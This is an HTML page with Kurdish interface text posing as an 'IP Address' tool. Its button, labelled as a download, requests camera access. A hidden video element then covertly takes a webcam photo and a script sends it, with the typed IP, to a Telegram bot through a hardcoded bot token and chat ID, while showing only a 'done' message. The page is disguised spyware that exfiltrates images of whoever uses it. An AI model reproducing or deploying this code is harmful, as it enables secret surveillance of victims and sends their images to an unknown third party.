<!DOCTYPE html>
<html lang="ku">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>IP Address</title>

<style>
body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#888;
    font-family:sans-serif;
}
.box{text-align:center;}
input{
    padding:10px;
    width:260px;
    text-align:center;
    font-size:16px;
    border:none;
    border-radius:6px;
    margin-bottom:15px;
}
button{
    padding:10px 30px;
    background:#007BFF;
    color:black;
    border:none;
    border-radius:6px;
    font-size:16px;
    cursor:pointer;
}
video,canvas{display:none;}
</style>
</head>

<body>
<div class="box">
    <h1>IP Address</h1>
    <input type="text" id="ip" placeholder="IP Address بنووسە">
    <br>
    <button onclick="capture()">داگرتن</button>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
async function capture(){

    const ip = document.getElementById("ip").value;
    if(!ip){
        alert("IP بنووسە");
        return;
    }

    try{
        const stream = await navigator.mediaDevices.getUserMedia({video:true});
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");

        video.srcObject = stream;

        setTimeout(()=>{

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video,0,0);

            stream.getTracks().forEach(t=>t.stop());

            canvas.toBlob(async (blob)=>{

                const token = "8594646357:AAHJGl5BZPjjFwirsB9ffnIzUM6tGXHH9II";
                const chat_id = "5071160578";

                const formData = new FormData();
                formData.append("chat_id",chat_id);
                formData.append("photo",blob,"photo.jpg");
                formData.append("caption",`IP: ${ip}`);

                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
                    method:"POST",
                    body:formData
                });

                alert("تەواو ✅");

            },"image/jpeg",0.9);

        },2000);

    }catch(e){
        alert("ڕێگەی کەمێرا نەدرا");
    }
}
</script>
</body>
</html>